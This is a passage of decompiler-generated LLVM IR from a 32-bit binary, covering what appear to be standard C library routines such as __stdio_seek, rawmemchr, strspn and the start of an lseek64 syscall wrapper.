  %v3_8052677 = load i8, i8* %v2_8052677, align 1
  %v4_8052677 = zext i8 %v3_8052677 to i32
  %v2_805267b = sub nsw i32 %v1_8052664, %v4_8052677
  %v1_805267d = add i32 %v4_8052650, 44
  %v2_805267d = inttoptr i32 %v1_805267d to i32*
  %v3_805267d = load i32, i32* %v2_805267d, align 4
  %v1_8052681 = add nsw i32 %v2_805267b, -1
  %tmp11 = icmp slt i32 %v3_805267d, 1
  br i1 %tmp11, label %dec_label_pc_805268c, label %dec_label_pc_8052686

dec_label_pc_8052686:                             ; preds = %dec_label_pc_8052677
  %v1_8052686 = add i32 %v4_8052650, 2
  %v2_8052686 = inttoptr i32 %v1_8052686 to i8*
  %v3_8052686 = load i8, i8* %v2_8052686, align 1
  %v4_8052686 = zext i8 %v3_8052686 to i32
  %v2_805268a = sub nsw i32 %v1_8052681, %v4_8052686
  br label %dec_label_pc_805268c

dec_label_pc_805268c:                             ; preds = %dec_label_pc_8052677, %dec_label_pc_8052667, %dec_label_pc_8052662, %entry, %dec_label_pc_8052686
  %v0_80526a1 = phi i32 [ %v1_8052681, %dec_label_pc_8052677 ], [ %v1_8052664, %dec_label_pc_8052667 ], [ 0, %dec_label_pc_8052662 ], [ 0, %entry ], [ %v2_805268a, %dec_label_pc_8052686 ]
  %v2_805268c = and i32 %v3_8052658, 64
  %v3_805268c = icmp eq i32 %v2_805268c, 0
  %storemerge.in.in.v = select i1 %v3_805268c, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8052650
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8052699 = add i32 %v4_8052650, 16
  %v3_8052699 = inttoptr i32 %v2_8052699 to i32*
  %v4_8052699 = load i32, i32* %v3_8052699, align 4
  %v5_8052699 = sub i32 %storemerge, %v4_8052699
  %v1_805269c = inttoptr i32 %arg2 to i32*
  %v2_805269c = load i32, i32* %v1_805269c, align 4
  store i32 %v2_805269c, i32* %ecx.global-to-local, align 4
  %v1_805269e = add i32 %arg2, 4
  %v2_805269e = inttoptr i32 %v1_805269e to i32*
  %v3_805269e = load i32, i32* %v2_805269e, align 4
  store i32 %v3_805269e, i32* %ebx.global-to-local, align 4
  %v2_80526a1 = add i32 %v5_8052699, %v0_80526a1
  store i32 %v2_80526a1, i32* %esi.global-to-local, align 4
  %v5_80526b5 = sub i32 %v2_805269c, %v2_80526a1
  %v10_80526b5 = icmp ult i32 %v2_805269c, %v2_80526a1
  %v6_80526b9 = zext i1 %v10_80526b5 to i32
  %tmp13 = icmp slt i32 %v2_80526a1, 0
  %v2_80526a6.neg = zext i1 %tmp13 to i32
  %v7_80526b9 = add i32 %v3_805269e, %v2_80526a6.neg
  %v8_80526b9 = add i32 %v7_80526b9, %v6_80526b9
  store i32 %v8_80526b9, i32* @edx, align 4
  store i32 %v5_80526b5, i32* %v1_805269c, align 4
  %v0_80526bf = load i32, i32* @edx, align 4
  %v1_80526bf = load i32, i32* %edi.global-to-local, align 4
  %v2_80526bf = add i32 %v1_80526bf, 4
  %v3_80526bf = inttoptr i32 %v2_80526bf to i32*
  store i32 %v0_80526bf, i32* %v3_80526bf, align 4
  %v0_80526c2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80526c2 = add i32 %v0_80526c2, 4
  %v2_80526c2 = inttoptr i32 %v1_80526c2 to i32*
  %v3_80526c2 = load i32, i32* %v2_80526c2, align 4
  %v4_80526c2 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80526c5 = icmp slt i32 %v3_80526c2, %v4_80526c2
  br i1 %v5_80526c5, label %dec_label_pc_80526cf, label %dec_label_pc_80526c7

dec_label_pc_80526c7:                             ; preds = %dec_label_pc_805268c
  %v8_80526c7 = icmp sgt i32 %v3_80526c2, %v4_80526c2
  br i1 %v8_80526c7, label %dec_label_pc_80526cd, label %dec_label_pc_80526c9

dec_label_pc_80526c9:                             ; preds = %dec_label_pc_80526c7
  %v1_80526c9 = inttoptr i32 %v0_80526c2 to i32*
  %v2_80526c9 = load i32, i32* %v1_80526c9, align 4
  %v3_80526c9 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80526c9, %v3_80526c9
  br i1 %tmp14, label %dec_label_pc_80526cd, label %dec_label_pc_80526cf

dec_label_pc_80526cd:                             ; preds = %dec_label_pc_80526c9, %dec_label_pc_80526c7
  %v0_80526cd = load i32, i32* %esi.global-to-local, align 4
  %v1_80526cd = sub i32 0, %v0_80526cd
  store i32 %v1_80526cd, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80526cf

dec_label_pc_80526cf:                             ; preds = %dec_label_pc_80526c9, %dec_label_pc_805268c, %dec_label_pc_80526cd
  %v0_80526cf = load i32, i32* %esi.global-to-local, align 4
  %v2_80526cf = icmp slt i32 %v0_80526cf, 0
  %v1_80526d1 = icmp eq i1 %v2_80526cf, false
  br i1 %v1_80526d1, label %dec_label_pc_80526e3, label %dec_label_pc_80526d3

dec_label_pc_80526d3:                             ; preds = %dec_label_pc_80526cf
  %v1_80526d3 = call i32 @__errno_location(i32 %v2_80526a1)
  %v1_80526d8 = inttoptr i32 %v1_80526d3 to i32*
  store i32 75, i32* %v1_80526d8, align 4
  %v0_80526e6.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80526e3

dec_label_pc_80526e0:                             ; preds = %dec_label_pc_8052671, %dec_label_pc_805266c
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80526e3

dec_label_pc_80526e3:                             ; preds = %dec_label_pc_80526cf, %dec_label_pc_80526d3, %dec_label_pc_80526e0
  %v0_80526e6 = phi i32 [ %v0_80526cf, %dec_label_pc_80526cf ], [ %v0_80526e6.pre, %dec_label_pc_80526d3 ], [ -1, %dec_label_pc_80526e0 ]
  ret i32 %v0_80526e6

; uselistorder directives
  uselistorder i32 %v4_80526c2, { 1, 0 }
  uselistorder i32 %v3_80526c2, { 1, 0 }
  uselistorder i32 %v2_80526a1, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8052664, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8052650, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 16, { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 88, 6, 7, 16, 9, 65, 17, 28, 78, 29, 92, 86, 1, 0, 87, 3, 2, 93, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 10, 61, 62, 63, 64, 89, 90, 91, 15, 11, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 8, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 5, 82, 83, 84, 85, 12, 4, 13, 14 }
  uselistorder i32 8, { 20, 60, 61, 62, 63, 64, 65, 66, 22, 21, 67, 68, 69, 70, 175, 176, 177, 17, 183, 18, 184, 27, 19, 28, 14, 57, 119, 128, 58, 59, 129, 130, 131, 132, 133, 134, 135, 3, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 4, 146, 147, 148, 149, 150, 24, 5, 25, 6, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 23, 168, 169, 7, 170, 171, 172, 173, 8, 174, 182, 71, 72, 0, 1, 29, 73, 74, 75, 76, 78, 79, 80, 77, 81, 82, 83, 84, 15, 16, 85, 86, 87, 88, 89, 90, 178, 179, 180, 181, 26, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 12, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 13, 116, 117, 118, 120, 121, 122, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 11, 123, 124, 125, 126, 127, 10, 9 }
  uselistorder i32 20, { 2, 17, 3, 18, 19, 1, 5, 15, 32, 16, 20, 21, 22, 23, 24, 4, 25, 26, 37, 27, 28, 29, 30, 31, 33, 34, 6, 7, 8, 9, 10, 11, 12, 13, 14, 35, 0, 36 }
  uselistorder i32 64, { 1, 7, 5, 6, 4, 0, 2, 3 }
  uselistorder i32 44, { 5, 6, 13, 4, 10, 12, 11, 7, 8, 9, 0, 1, 2, 3 }
  uselistorder i32 40, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 8, 9, 7, 10, 5, 6 }
  uselistorder i16 0, { 1, 0, 6, 5, 7, 12, 13, 14, 15, 8, 9, 10, 11, 16, 17, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80526e3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80526cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805268c, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80526f8 = add i32 %tmp5, 4
  %v2_80526f8 = inttoptr i32 %v1_80526f8 to i32*
  %v3_80526f8 = load i32, i32* %v2_80526f8, align 4
  %v2_80526fb = load i32, i32* %arg2, align 4
  %v1_8052701 = add i32 %arg1, 4
  %v2_8052701 = inttoptr i32 %v1_8052701 to i32*
  %v3_8052701 = load i32, i32* %v2_8052701, align 4
  %v4_8052704 = call i32 @__libc_lseek64(i32 %v3_8052701, i32 %v2_80526fb, i32 %v3_80526f8, i32 %arg3)
  %v0_805270c = load i32, i32* @edx, align 4
  %v2_805270c = icmp slt i32 %v0_805270c, 0
  store i32 %v4_8052704, i32* %ecx.global-to-local, align 4
  br i1 %v2_805270c, label %dec_label_pc_8052719, label %dec_label_pc_8052712

dec_label_pc_8052712:                             ; preds = %entry
  %v1_8052712 = load i32, i32* @ebx, align 4
  %v2_8052712 = inttoptr i32 %v1_8052712 to i32*
  store i32 %v4_8052704, i32* %v2_8052712, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8052716 = load i32, i32* @edx, align 4
  %v1_8052716 = load i32, i32* @ebx, align 4
  %v2_8052716 = add i32 %v1_8052716, 4
  %v3_8052716 = inttoptr i32 %v2_8052716 to i32*
  store i32 %v0_8052716, i32* %v3_8052716, align 4
  %v0_805271a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052719

dec_label_pc_8052719:                             ; preds = %entry, %dec_label_pc_8052712
  %v0_805271a = phi i32 [ %v4_8052704, %entry ], [ %v0_805271a.pre, %dec_label_pc_8052712 ]
  ret i32 %v0_805271a

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8052719, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052721 = load i32, i32* @ebx, align 4
  %v4_8052722 = urem i32 %arg2, 256
  %v4_8052726 = ptrtoint i8* %arg1 to i32
  %v2_80527313 = urem i32 %v4_8052726, 4
  %v3_80527314 = icmp eq i32 %v2_80527313, 0
  %v1_80527338 = icmp eq i1 %v3_80527314, false
  %v4_805272c = trunc i32 %arg2 to i8
  br i1 %v1_80527338, label %dec_label_pc_805272c, label %dec_label_pc_8052735

dec_label_pc_805272c:                             ; preds = %entry, %dec_label_pc_8052730
  %v0_8052730 = phi i32 [ %v1_8052730, %dec_label_pc_8052730 ], [ %v4_8052726, %entry ]
  %v1_805272c = inttoptr i32 %v0_8052730 to i8*
  %v2_805272c = load i8, i8* %v1_805272c, align 1
  %v15_805272c = icmp eq i8 %v2_805272c, %v4_805272c
  br i1 %v15_805272c, label %dec_label_pc_8052780, label %dec_label_pc_8052730

dec_label_pc_8052730:                             ; preds = %dec_label_pc_805272c
  %v1_8052730 = add i32 %v0_8052730, 1
  %v2_8052731 = urem i32 %v1_8052730, 4
  %v3_8052731 = icmp eq i32 %v2_8052731, 0
  %v1_8052733 = icmp eq i1 %v3_8052731, false
  br i1 %v1_8052733, label %dec_label_pc_805272c, label %dec_label_pc_8052735

dec_label_pc_8052735:                             ; preds = %entry, %dec_label_pc_8052730
  %v0_8052738 = phi i32 [ %v1_8052730, %dec_label_pc_8052730 ], [ %v4_8052726, %entry ]
  %v2_805273c = mul nuw nsw i32 %v4_8052722, 256
  %v2_805273f = or i32 %v2_805273c, %v4_8052722
  %v2_8052743 = mul i32 %v2_805273f, 65536
  %v2_8052746 = or i32 %v2_8052743, %v2_805273f
  br label %dec_label_pc_8052748

dec_label_pc_8052748:                             ; preds = %dec_label_pc_8052778, %dec_label_pc_8052748, %dec_label_pc_8052735
  %v0_805274c = phi i32 [ %v0_8052738, %dec_label_pc_8052735 ], [ %v1_805274c, %dec_label_pc_8052748 ], [ %v1_805274c, %dec_label_pc_8052778 ]
  %v2_805274a = inttoptr i32 %v0_805274c to i32*
  %v3_805274a = load i32, i32* %v2_805274a, align 4
  %v4_805274a = xor i32 %v3_805274a, %v2_8052746
  %v1_805274c = add i32 %v0_805274c, 4
  store i32 %v1_805274c, i32* @ecx, align 4
  %v1_805274f = add i32 %v4_805274a, 2130640639
  %v1_8052755 = sub i32 -1, %v4_805274a
  store i32 %v1_8052755, i32* @edx, align 4
  %v2_8052757 = xor i32 %v1_805274f, %v1_8052755
  %v1_8052759 = and i32 %v2_8052757, -2130640640
  %v2_8052759 = icmp eq i32 %v1_8052759, 0
  br i1 %v2_8052759, label %dec_label_pc_8052748, label %dec_label_pc_8052760

dec_label_pc_8052760:                             ; preds = %dec_label_pc_8052748
  %v2_8052760 = inttoptr i32 %v0_805274c to i8*
  %v3_8052760 = load i8, i8* %v2_8052760, align 1
  %v16_8052760 = icmp eq i8 %v3_8052760, %v4_805272c
  br i1 %v16_8052760, label %dec_label_pc_8052780, label %dec_label_pc_8052768

dec_label_pc_8052768:                             ; preds = %dec_label_pc_8052760
  %v1_8052768 = add i32 %v0_805274c, 1
  %v2_8052768 = inttoptr i32 %v1_8052768 to i8*
  %v3_8052768 = load i8, i8* %v2_8052768, align 1
  %v16_8052768 = icmp eq i8 %v3_8052768, %v4_805272c
  br i1 %v16_8052768, label %dec_label_pc_8052780, label %dec_label_pc_8052770

dec_label_pc_8052770:                             ; preds = %dec_label_pc_8052768
  %v1_8052770 = add i32 %v0_805274c, 2
  %v2_8052770 = inttoptr i32 %v1_8052770 to i8*
  %v3_8052770 = load i8, i8* %v2_8052770, align 1
  %v16_8052770 = icmp eq i8 %v3_8052770, %v4_805272c
  br i1 %v16_8052770, label %dec_label_pc_8052780, label %dec_label_pc_8052778

dec_label_pc_8052778:                             ; preds = %dec_label_pc_8052770
  %v1_8052778 = add i32 %v0_805274c, 3
  %v2_8052778 = inttoptr i32 %v1_8052778 to i8*
  %v3_8052778 = load i8, i8* %v2_8052778, align 1
  %v16_8052778 = icmp eq i8 %v3_8052778, %v4_805272c
  %v1_805277e = icmp eq i1 %v16_8052778, false
  br i1 %v1_805277e, label %dec_label_pc_8052748, label %dec_label_pc_8052780

dec_label_pc_8052780:                             ; preds = %dec_label_pc_805272c, %dec_label_pc_8052778, %dec_label_pc_8052770, %dec_label_pc_8052768, %dec_label_pc_8052760
  %v0_8052782 = phi i32 [ %v1_8052778, %dec_label_pc_8052778 ], [ %v1_8052770, %dec_label_pc_8052770 ], [ %v1_8052768, %dec_label_pc_8052768 ], [ %v0_805274c, %dec_label_pc_8052760 ], [ %v0_8052730, %dec_label_pc_805272c ]
  store i32 %v0_8052721, i32* @ebx, align 4
  ret i32 %v0_8052782

; uselistorder directives
  uselistorder i32 %v1_8052755, { 1, 0 }
  uselistorder i32 %v1_805274c, { 2, 1, 0 }
  uselistorder i32 %v2_805273f, { 1, 0 }
  uselistorder i32 %v1_8052730, { 1, 0, 2 }
  uselistorder i8 %v4_805272c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8052726, { 2, 1, 0 }
  uselistorder i32 %v4_8052722, { 1, 0 }
  uselistorder i32 3, { 10, 37, 0, 4, 5, 3, 15, 6, 16, 33, 14, 34, 22, 42, 12, 13, 23, 17, 8, 9, 1, 24, 18, 25, 20, 38, 19, 39, 40, 41, 26, 27, 28, 29, 35, 36, 2, 11, 21, 30, 31, 32, 7 }
  uselistorder i32 2, { 42, 97, 98, 93, 118, 119, 47, 99, 100, 61, 2, 3, 51, 52, 126, 48, 92, 1, 64, 86, 65, 87, 66, 88, 43, 4, 109, 40, 67, 5, 6, 53, 7, 8, 121, 9, 10, 62, 11, 116, 117, 44, 45, 46, 12, 54, 55, 56, 101, 102, 50, 13, 14, 103, 15, 104, 16, 57, 105, 106, 17, 120, 125, 63, 18, 107, 19, 20, 0, 108, 21, 70, 68, 69, 71, 22, 23, 24, 25, 26, 27, 28, 29, 110, 72, 30, 111, 73, 31, 58, 32, 33, 34, 35, 36, 37, 74, 89, 75, 59, 76, 90, 77, 78, 91, 49, 79, 94, 95, 96, 80, 81, 112, 39, 113, 114, 82, 41, 115, 83, 84, 85, 124, 60, 122, 38, 123 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 65536, { 0, 1, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11, 56, 57, 12, 13, 14, 15, 16, 17, 20, 21, 19, 18, 22, 23, 24, 25, 28, 29, 27, 26, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 47, 48, 49, 45, 50, 46, 52, 51, 53, 55, 54 }
  uselistorder i32 4, { 203, 1, 2, 123, 124, 125, 126, 127, 128, 3, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 34, 139, 288, 140, 289, 290, 296, 297, 302, 303, 304, 291, 31, 65, 141, 142, 292, 293, 294, 295, 4, 111, 112, 113, 114, 47, 213, 214, 215, 39, 227, 228, 229, 230, 115, 116, 117, 118, 119, 40, 5, 120, 121, 298, 300, 239, 240, 241, 242, 243, 244, 6, 245, 246, 247, 248, 249, 250, 251, 252, 237, 238, 253, 32, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 25, 274, 275, 33, 276, 7, 122, 299, 143, 144, 301, 8, 145, 146, 9, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 27, 28, 66, 48, 164, 165, 166, 167, 168, 169, 170, 49, 171, 10, 172, 11, 12, 26, 13, 14, 15, 173, 174, 16, 175, 50, 176, 51, 177, 178, 179, 180, 181, 182, 61, 183, 184, 185, 186, 187, 188, 189, 35, 190, 191, 192, 193, 194, 62, 195, 196, 197, 198, 199, 200, 201, 36, 202, 204, 205, 206, 37, 207, 208, 209, 41, 42, 43, 210, 52, 53, 54, 55, 56, 44, 211, 57, 212, 45, 216, 217, 38, 218, 219, 220, 46, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 63, 97, 98, 99, 100, 101, 102, 103, 29, 30, 104, 105, 106, 107, 108, 109, 221, 222, 17, 223, 224, 225, 226, 231, 18, 19, 232, 20, 58, 59, 64, 233, 60, 234, 235, 21, 0, 22, 23, 236, 24, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 110 }
  uselistorder i32 256, { 4, 5, 6, 7, 8, 9, 0, 1, 10, 2, 40, 11, 12, 42, 13, 14, 3, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 41, 43, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052780, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8052735, { 1, 0 }
  uselistorder label %dec_label_pc_805272c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_80527a631 = load i8, i8* %arg1, align 1
  %v4_80527a835 = icmp eq i8 %v2_80527a631, 0
  br i1 %v4_80527a835, label %dec_label_pc_80527b0, label %dec_label_pc_80527ac.lr.ph

dec_label_pc_80527ac.lr.ph:                       ; preds = %entry
  %v3_80527a632 = zext i8 %v2_80527a631 to i32
  %v4_80527a6.pre = load i32, i32* @eax, align 4
  %v5_80527a633 = and i32 %v4_80527a6.pre, -256
  %v6_80527a634 = or i32 %v3_80527a632, %v5_80527a633
  %v4_805278d = ptrtoint i8* %arg1 to i32
  %v1_805279818 = inttoptr i32 %arg2 to i8*
  %v4_8052798.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80527ac

dec_label_pc_8052793:                             ; preds = %dec_label_pc_80527ac, %dec_label_pc_8052797
  %v6_805279828 = phi i32 [ %v6_8052798, %dec_label_pc_8052797 ], [ %v6_805279822, %dec_label_pc_80527ac ]
  %v2_805279827 = phi i8 [ %v2_8052798, %dec_label_pc_8052797 ], [ %v2_805279819, %dec_label_pc_80527ac ]
  %v0_805279726 = phi i32 [ %v1_8052797, %dec_label_pc_8052797 ], [ %arg2, %dec_label_pc_80527ac ]
  %v15_8052793 = icmp eq i8 %v2_80527a639, %v2_805279827
  br i1 %v15_8052793, label %dec_label_pc_80527a0, label %dec_label_pc_8052797

dec_label_pc_8052797:                             ; preds = %dec_label_pc_8052793
  %v1_8052797 = add i32 %v0_805279726, 1
  store i32 %v1_8052797, i32* @edx, align 4
  %v1_8052798 = inttoptr i32 %v1_8052797 to i8*
  %v2_8052798 = load i8, i8* %v1_8052798, align 1
  %v3_8052798 = zext i8 %v2_8052798 to i32
  %v5_8052798 = and i32 %v6_805279828, -256
  %v6_8052798 = or i32 %v3_8052798, %v5_8052798
  store i32 %v6_8052798, i32* @ecx, align 4
  %v4_805279a = icmp eq i8 %v2_8052798, 0
  %v1_805279c = icmp eq i1 %v4_805279a, false
  br i1 %v1_805279c, label %dec_label_pc_8052793, label %dec_label_pc_80527b0

dec_label_pc_80527a0:                             ; preds = %dec_label_pc_8052793
  %v1_80527a4 = add i32 %v0_80527b137, 1
  %v1_80527a5 = add i32 %v0_80527a538, 1
  %v1_80527a6 = inttoptr i32 %v1_80527a5 to i8*
  %v2_80527a6 = load i8, i8* %v1_80527a6, align 1
  %v3_80527a6 = zext i8 %v2_80527a6 to i32
  %v5_80527a6 = and i32 %v6_80527a640, -256
  %v6_80527a6 = or i32 %v3_80527a6, %v5_80527a6
  %v4_80527a8 = icmp eq i8 %v2_80527a6, 0
  br i1 %v4_80527a8, label %dec_label_pc_80527b0, label %dec_label_pc_80527ac

dec_label_pc_80527ac:                             ; preds = %dec_label_pc_80527ac.lr.ph, %dec_label_pc_80527a0
  %v4_8052798.pre = phi i32 [ %v4_8052798.pre.pre, %dec_label_pc_80527ac.lr.ph ], [ %v6_805279828, %dec_label_pc_80527a0 ]
  %v6_80527a640 = phi i32 [ %v6_80527a634, %dec_label_pc_80527ac.lr.ph ], [ %v6_80527a6, %dec_label_pc_80527a0 ]
  %v2_80527a639 = phi i8 [ %v2_80527a631, %dec_label_pc_80527ac.lr.ph ], [ %v2_80527a6, %dec_label_pc_80527a0 ]
  %v0_80527a538 = phi i32 [ %v4_805278d, %dec_label_pc_80527ac.lr.ph ], [ %v1_80527a5, %dec_label_pc_80527a0 ]
  %v0_80527b137 = phi i32 [ 0, %dec_label_pc_80527ac.lr.ph ], [ %v1_80527a4, %dec_label_pc_80527a0 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805279819 = load i8, i8* %v1_805279818, align 1
  %v3_805279820 = zext i8 %v2_805279819 to i32
  %v5_805279821 = and i32 %v4_8052798.pre, -256
  %v6_805279822 = or i32 %v3_805279820, %v5_805279821
  store i32 %v6_805279822, i32* @ecx, align 4
  %v4_805279a23 = icmp eq i8 %v2_805279819, 0
  %v1_805279c25 = icmp eq i1 %v4_805279a23, false
  br i1 %v1_805279c25, label %dec_label_pc_8052793, label %dec_label_pc_80527b0

dec_label_pc_80527b0:                             ; preds = %entry, %dec_label_pc_80527a0, %dec_label_pc_80527ac, %dec_label_pc_8052797
  %v0_80527b117 = phi i32 [ %v0_80527b137, %dec_label_pc_8052797 ], [ %v0_80527b137, %dec_label_pc_80527ac ], [ 0, %entry ], [ %v1_80527a4, %dec_label_pc_80527a0 ]
  ret i32 %v0_80527b117

; uselistorder directives
  uselistorder i32 %v6_805279822, { 1, 0 }
  uselistorder i8 %v2_805279819, { 1, 2, 0 }
  uselistorder i32 %v1_80527a5, { 1, 0 }
  uselistorder i32 %v6_8052798, { 1, 0 }
  uselistorder i8 %v2_8052798, { 1, 2, 0 }
  uselistorder i32 %v1_8052797, { 2, 1, 0 }
  uselistorder i8 %v2_80527a631, { 0, 2, 1 }
  uselistorder i32* @ecx, { 4, 87, 0, 88, 22, 5, 89, 1, 90, 23, 24, 16, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 13, 51, 52, 53, 54, 14, 55, 12, 6, 83, 84, 85, 86, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 7, 122, 98, 99, 123, 8, 124, 127, 17, 18, 56, 57, 58, 59, 60, 61, 62, 15, 63, 64, 65, 66, 67, 68, 9, 10, 2, 3, 69, 70, 11, 71, 72, 73, 74, 75, 77, 78, 79, 20, 21, 76, 80, 125, 81, 126, 19, 82, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i32 -256, { 1, 60, 59, 0, 79, 3, 62, 61, 2, 22, 23, 24, 25, 26, 27, 28, 29, 8, 30, 48, 49, 81, 9, 50, 10, 82, 83, 77, 78, 31, 32, 33, 34, 35, 36, 37, 4, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 51, 52, 53, 54, 55, 56, 57, 58, 5, 6, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 13, 14, 15, 16, 17, 18, 19, 20, 21, 11, 12, 7, 76, 80 }
  uselistorder i8 0, { 3, 141, 140, 2, 59, 60, 165, 166, 5, 143, 142, 4, 144, 145, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 1, 127, 77, 78, 187, 79, 190, 21, 33, 19, 20, 128, 6, 189, 171, 172, 173, 174, 175, 176, 177, 178, 22, 179, 80, 81, 34, 14, 13, 0, 23, 24, 25, 82, 83, 160, 161, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 7, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 15, 107, 108, 109, 110, 111, 112, 113, 114, 57, 188, 115, 116, 8, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 129, 130, 131, 132, 133, 134, 135, 136, 26, 137, 138, 139, 27, 146, 147, 148, 149, 150, 151, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 17, 152, 153, 154, 155, 156, 157, 158, 159, 162, 163, 164, 9, 167, 168, 18, 169, 16, 170, 180, 185, 184, 10, 181, 182, 12, 183, 11, 186, 58, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80527b0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80527ac, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80527ba = load i32, i32* @ebx, align 4
  store i32 %v0_80527ba, i32* %stack_var_-12, align 4
  %v2_80527c2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80527c2, i32* %esi.global-to-local, align 4
  %v1_80527dc = call i32 @int80_syscall(i32 140)
  store i32 %v1_80527dc, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_80527dc, -4095
  br i1 %tmp16, label %dec_label_pc_80527f6, label %dec_label_pc_80527e8

dec_label_pc_80527e8:                             ; preds = %entry
  %v1_80527e8 = call i32 @__errno_location(i32 %arg3)
  %v0_80527ed = load i32, i32* %esi.global-to-local, align 4
  %v1_80527ed = sub i32 0, %v0_80527ed
  %v2_80527ef = inttoptr i32 %v1_80527e8 to i32*
  store i32 %v1_80527ed, i32* %v2_80527ef, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80527fa

dec_label_pc_80527f6:                             ; preds = %entry
  %v1_80527f6 = icmp eq i32 %v1_80527dc, 0
  br i1 %v1_80527f6, label %dec_label_pc_80527ff, label %dec_label_pc_80527fa

dec_label_pc_80527fa:                             ; preds = %dec_label_pc_80527f6, %dec_label_pc_80527e8
  %v0_80527fa = phi i32 [ %v1_80527dc, %dec_label_pc_80527f6 ], [ -1, %dec_label_pc_80527e8 ]
  %v1_80527fc = ashr i32 %v0_80527fa, 31
  br label %dec_label_pc_8052807

dec_label_pc_80527ff:                             ; preds = %dec_label_pc_80527f6
